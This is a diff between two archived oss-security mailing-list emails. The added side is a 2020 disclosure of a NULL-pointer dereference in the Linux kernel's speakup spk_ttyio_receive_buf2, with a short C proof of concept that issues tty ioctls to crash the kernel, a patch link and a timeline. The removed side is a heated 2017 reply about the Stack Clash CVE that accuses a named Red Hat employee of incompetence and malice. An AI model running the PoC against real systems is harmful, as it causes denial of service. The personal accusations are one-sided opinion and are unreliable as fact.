@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["7097" "Wednesday" "21" "June" "2017" "08:25:26" "-0400" "Brad Spengler" "spender@grsecurity.net" "<20170621122526.GA32701@grsecurity.net>" "139" "Re: [oss-security] Qualys Security Advisory - The Stack Clash" "^Date:" nil nil "6" "2017062112:25:26" "[oss-security] Qualys Security Advisory - The Stack Clash" (number mark "        spender@grse Jun 21  139/7097  " thread-indent "\"Re: [oss-security] Qualys Security Advisory - The Stack Clash\"\n") "<14558692.afnJ5aRU9J@wanheda>" ("<20170619152843.GC7769@localhost.localdomain>" "<14558692.afnJ5aRU9J@wanheda>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1907" "Monday" "7" "December" "2020" "10:20:44" "+0800" "Shisong Qin" "qinshisong1205@gmail.com" "<CAM1BPE5H=DB0=83v4+i4pqUCJeJre5UTv5XSSV1MoX-4Ufyb0A@mail.gmail.com>" "72" "[oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_receive_buf2" nil nil nil "12" "2020120702:20:44" "[oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_receive_buf2" (number mark "U       qinshisong12 Dec  7   72/1907  " thread-indent "\"[oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_receive_buf2\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_receive_buf2" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 17935 invoked by uid 550); 21 Jun 2017 13:10:53 -0000
+Received: (qmail 3643 invoked by uid 550); 7 Dec 2020 05:08:29 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,158 +11,111 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 30557 invoked from network); 21 Jun 2017 12:25:38 -0000
-Message-ID: <20170621122526.GA32701@grsecurity.net>
-References: <20170619152843.GC7769@localhost.localdomain>
- <14558692.afnJ5aRU9J@wanheda>
-MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha512;
-	protocol="application/pgp-signature"; boundary="h31gzZEtNLTqOjlF"
-Content-Disposition: inline
-In-Reply-To: <14558692.afnJ5aRU9J@wanheda>
-User-Agent: Mutt/1.5.21 (2010-09-15)
-Date: Wed, 21 Jun 2017 08:25:26 -0400
-From: Brad Spengler <spender@grsecurity.net>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] Qualys Security Advisory - The Stack Clash
+Received: (qmail 26279 invoked from network); 7 Dec 2020 02:21:07 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=mime-version:from:date:message-id:subject:to:cc;
+        bh=2G8ox7YJrnjN6pSXTkaeRF+f+NssI16PBezfvHIcbuQ=;
+        b=ZRxA/c5annBCst3helD67bsWu7oeNf+X25CdY19xk2gBsVye/fTXX0lpJ1lvYN23fn
+         gQHt5SgQYi0dybQut4usbE/dWsXvTlcaS6GF8JOSd1q5M70Wbwy4C0iXdxpcU2oerSLb
+         3UwNpJghWhfIGyVl7xEz1EPeM9aOY8yM1QOwOKapUTxMHy/AAzL+8z353C2kozh3ZBRN
+         8qLRJjMM+WNPe+mVXD3+PaarvvU0xiC0xy64Fr6M2OQT/0ZM94qK2KySMQsfve5+T+5A
+         btx+S4TE2P2dsq4rQSRN46l8VFg1PJ1g+ExtSvC29MtCq4dTMPdPZA0HbDbvRx2KUOqY
+         zChQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
+        bh=2G8ox7YJrnjN6pSXTkaeRF+f+NssI16PBezfvHIcbuQ=;
+        b=hvfp3YlMj0oF+p+JYZcCeOpAVyPgykY77L8Jjlsve4zsZZMg3vvfmMoB+C/4PThm0a
+         shxr93dpAKZoRI8xiJMLCtLhlfQpM7CJashtDLKhHBqTJK8rUQsONP1RMPZ/tWn+lq/c
+         vfnQYkkOjXc6Y3f+TWtmuWMHVbNVeeS2eAyS3lfWXEK2ySjArQN/5r32GV3SwVBwNxSh
+         MDJ5eYsaPNJ5iHasBl3mIbXcqRooaNs4C0jmvwR92d3nModSRlSsvbFVIAgQAb6nGQ1b
+         242kQIOy9bUUlRncCrHL0E+8ucu8fD14mAV766+ACBw3TdQtt9qAO8evm1AN0qWHXq+R
+         64vw==
+X-Gm-Message-State: AOAM532DJxeLnRaZM9TXZNaAamnP6q/c+jn9B2lsH3axDZnMyLDPTiPY
+	BziGM8ZAMER5MLzzfyqI2wiZ2+QFrr0baBw/u7XgL2BiqgQFRw==
+X-Google-Smtp-Source: ABdhPJx2u83JRP62jmbPO7TroaI83/jkR89EUzfjoDI6ozPPCOgpsdolQGRVcI6LMNK48eNqZilte01nsRgQE5plwfg=
+X-Received: by 2002:adf:aa4a:: with SMTP id q10mr16662103wrd.276.1607307655195;
+ Sun, 06 Dec 2020 18:20:55 -0800 (PST)
+MIME-Version: 1.0
+From: Shisong Qin <qinshisong1205@gmail.com>
+Date: Mon, 7 Dec 2020 10:20:44 +0800
+Message-ID: <CAM1BPE5H=DB0=83v4+i4pqUCJeJre5UTv5XSSV1MoX-4Ufyb0A@mail.gmail.com>
 To: oss-security@lists.openwall.com
+Cc: nopitydays@gmail.com
+Content-Type: multipart/alternative; boundary="000000000000d52d7505b5d679ef"
+Subject: [oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_receive_buf2
 
---h31gzZEtNLTqOjlF
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
+--000000000000d52d7505b5d679ef
+Content-Type: text/plain; charset="UTF-8"
 
-On Wed, Jun 21, 2017 at 12:46:28PM +0200, Agostino Sarubbo wrote:
-> On Monday 19 June 2017 08:28:43 Qualys Security Advisory wrote:
-> > III. Solutions
-> > - Recompile all userland code (ld.so, libraries, binaries) with GCC's
-> >   "-fstack-check" option, which prevents the stack-pointer from moving
-> >   into another memory region without accessing the stack guard-page (it
-> >   writes one word to every 4KB page allocated on the stack).
->=20
-> For the record, Gentoo Hardened enables by default -fstack-check=3Dspecif=
-ic
+Hi,
 
-I'd also like to mention for the record, that despite tweets like:
-https://twitter.com/kurtseifried/status/876818809079816193
-"CVE-2017-1000377 Oh you thought running GRsecurity PAX was going to save=20
-you?"
-https://twitter.com/GentooHardened/status/877309872714522624
-(the latter apparently having been removed, while the former is
-still going strong solely due to the stubbornness of its author)
+Recently we found another NULL-ptr deref BUG in spk_ttyio.c in the latest
+Linux kernel(5.9.11 is the latest at that now). In the
+spk_ttyio_receive_buf2() function, it would dereference spk_ttyio_synth
+without checking whether it is NULL or not, and may lead to a NULL-ptr
+deref crash.
 
-grsecurity was the only project without a valid CVE assigned to it.
+This bug could be reproduced in the Linux kernel (e.g. 5.9.11) with
+CONFIG_ACCESSIBILITY=y, CONFIG_SPEAKUP=y and CONFIG_KASAN=y, and here is a
+simple poc:
 
-Kurt Seifried of Red Hat chose to make use of the 4 weeks he had in=20
-private to assign a bogus CVE against grsecurity (let's ignore that Kurt=20
-thinks "GRsecurity" is a vendor and "PAX" is a product), then shot off=20
-with a claim completely opposite from that present in the advisory.=20=20
-Despite being called out on it by numerous people in public, and despite=20
-my offering in private to allow him to correct his own almost=20
-gleefully-published lies, he's instead chosen to waste two full days of=20
-our time and that of several others, including Qualys, who for the public=20
-record did not request the CVE against grsecurity.  Kurt Seifried of Red=20
-Hat chose to do it himself, and even provided private emails=20
-demonstrating as such.
+#define _GNU_SOURCE
 
-In my view, this taints the CVE process when someone apparently so
-biased fails to take responsibility for their own actions, and uses their
-position as judge, jury, and executioner of the DWF/CVE process to dole
-out damaging claims that are in direct opposition to what was stated in
-the advisory in the first place, for anyone who had read it at all.
+#include <dirent.h>
+#include <endian.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdarg.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <time.h>
+#include <unistd.h>
 
-Either Kurt Seifried of Red Hat didn't read the advisory at all in those
-4 weeks, or he was too incompetent to understand the clear statements
-being made in it, and too stubborn to admit his mistake, choosing to
-leave his tweet up even now, apparently waiting for the news cycle to
-end on this issue.
+#pragma pack(1)
+typedef struct {
+        char subcode;
+        short xs, ys, xe, ye;
+        short sel_mode;
+} sel_struct;
 
-I was not contacted about this CVE ahead of time where it would have
-been trivial to correct any incompetence on the part of Kurt prior to
-the CVE being incorrectly issued -- my first notification was his
-childish tweet, not something I would expect from a supposed professional
-during work hours at his Red Hat employment.
+int main(int argc, char const *argv[]) {
 
-Kurt gave excuse after excuse, finally hiding behind the CVE process=20
-itself, insisting Qualys would need to provide some reason for rejection=20
-of the CVE (which they did, despite it not being necessary for them to do=20
-so as they never requested the CVE in the first place).  This was purely=20
-the fault of Kurt Seifried, and he alone chose to intentionally delay the=20
-entire process of correcting the matter, and also gave no justification=20
-as to why his completely false tweet still remained despite there being=20
-no formal process required there once it was abundantly clear he was in=20
-the wrong.  I would be happy to assume Kurt was simply incompetent and=20
-either didn't read the advisory or didn't understand the simple facts=20
-contained in it (like that the PoC would take over 1500 years to work=20
-against grsecurity under even an intentionally weakened configuration),=20
-but his stubborn refusal to remove or correct a tweet he is clearly aware=20
-now is wrong suggests to me nothing other than maliciousness.
+    int disc = 0x1a;
+    int fd = open("/dev/tty1", 0, 0);
+    ioctl(fd, 0x5423, &disc);
 
-If I am wrong about something, I am happy to own up to it ASAP -- why
-is it so difficult for certain other people to act decently?
+    sel_struct sel;
+    sel.subcode = 2;
+    sel.xs = sel.ys = sel.xe = sel.ye = 0;
+    sel.sel_mode = 0x0; // sel_mode = 0x0/0x1/0x2 could trigger this
+NULL-ptr dereference bug
+    ioctl(fd, 0x541c, &sel);
+    char data = 3;
+    ioctl(fd, 0x541c, &data);
+    return 0;
+}
 
-It doesn't bode well for the embargoing process if this is how things
-are going to work for projects that don't participate.  Is the purpose
-to prepare Red Hat's marketing materials in advance?  To hide the fact
-that this issue should have been obvious to them many years ago but
-due to their lack of investment in security despite being a
-multi-billion dollar company they failed to protect their customers
-against it?  Was the purpose for upstream developers to spend 4 weeks
-NIH'ing our existing fix for this issue from 2010, repeating the same
-events from 2010 as they've yet again produced a broken patch that oopses
-machines and failed under trivial fuzzing?
+Here is the commit to patch this BUG:
+https://git.kernel.org/pub/scm/linux/kernel/git/gregkh/char-misc.git/commit/?h=char-misc-linus&id=f0992098cadb4c9c6a00703b66cafe604e178fea
 
-Because if any lesson can be taken away from this whole mess, it's
-certainly not whatever these others that didn't protect their users
-for all these years have to say about it.  It's a clear vindication of
-our security strategy and a demonstration of what happens when actual
-investment and effective original ideas informed by offense are put
-into security.
+Timeline:
+* 2020/11/24 - Vulnerability reported to security@kernel.org
+* 2020/11/29 - Vulnerability confirmed, and reported to
+linux-distros@vs.openwall.org.
+* 2020/12/7 - Vulnerability opened.
 
-Finally, one thing I noted was missing from Solar's timeline is that
-on May 18th, the day after the private distros list was notified with
-details, this commit appeared in public:
-https://github.com/openbsd/src/commit/4ed6bfeac112229466414b94cdbd983fb8017=
-796
+Thanks, Shisong Qin and Bodong Zhao, Tsinghua University
 
-OpenBSD publishing this commit, in combination with Solar making repeated
-mentions here on oss-sec about a cross-OS issue being worked on was enough
-for me to know that the underlying issue being discussed was what we had
-widely discussed publicly in 2010 on LWN and elsewhere.  What's the official
-explanation for this, and is any action being taken for what I assume is a
-member of the private list breaking the embargo?
-
-Appendix:
-Famous last words from the PaX Team in reply to Linus' broken heap stack gap
-code from 2010:
-https://lkml.org/lkml/2011/6/6/306
-"what a pity that now you get to revert the whole shit
-and implement it properly (i don't need to tell you where you can find such
-a working solution, do i)."
-(the whole post is quite good as an example of the dangers of NIH)
-
--Brad
-
---h31gzZEtNLTqOjlF
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: Digital signature
-
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.12 (GNU/Linux)
-
-iQIcBAEBCgAGBQJZSmWuAAoJEETRwPglJf5J4FgP/RhICjWBsspIfEgEtVsH+qEw
-mmcn0cLoNhgkrOKBvXZGVwa30/zKfpRUQPFu7sFB1rsTxD/Pg3UrBxJyfP86b+hs
-cBt0+m0tuH2d7JgvKbX+EQNmnvAXl9O989BGRuFWCIX6AZ7MHFlBOtIrZK7mbfmc
-1sqns4QiFYVVi4XruIr0FeiS+6xNQ62VPLmP8CO7ZLf+MZ2r99sDYlC6HhsLPiZy
-no7qaLVsznDtOnYxfSWwLwalBzwPzkiBes1OLpfL3UT3zHUFNrJ8Hi93eENKEbge
-fhXiPJ7qDNv3ldZ+z5GiudhOB7wx2lKIAmR9/lVnz0k9DZbIgXi6rv/w32QUtK5j
-a7WulALgzk+XahA+SZYh7SzLZ/xN3/qlK8QQAt2OncHi4SX32yHjgeAtnMwPd2+Q
-MDNf6jfJb9YV4fFDRzOjtUureYj2UnmXsydvlJK0f6ScehdPXqCoQ4dVObd71aMC
-UsPrPCv9BXTcEsEn0XbAO3xnP0MdFn5lOjnJAOq/8ukmxhGwvlLlr0LV104yEyDN
-Cs8jprRp7WAxzQY0SQEBCyCwDds91Upey3f6aZktPXVcsGOTjK8BEBlN0njEqvRB
-uLWOZjGUktwYnbCgED+MhQWkHPaB8lEYpGIGlEuKyHXtNv/6C533LCtWEW9LdLgj
-CfjGb+AwDWFGcb5saVqg
-=G4xX
------END PGP SIGNATURE-----
-
---h31gzZEtNLTqOjlF--
+--000000000000d52d7505b5d679ef--
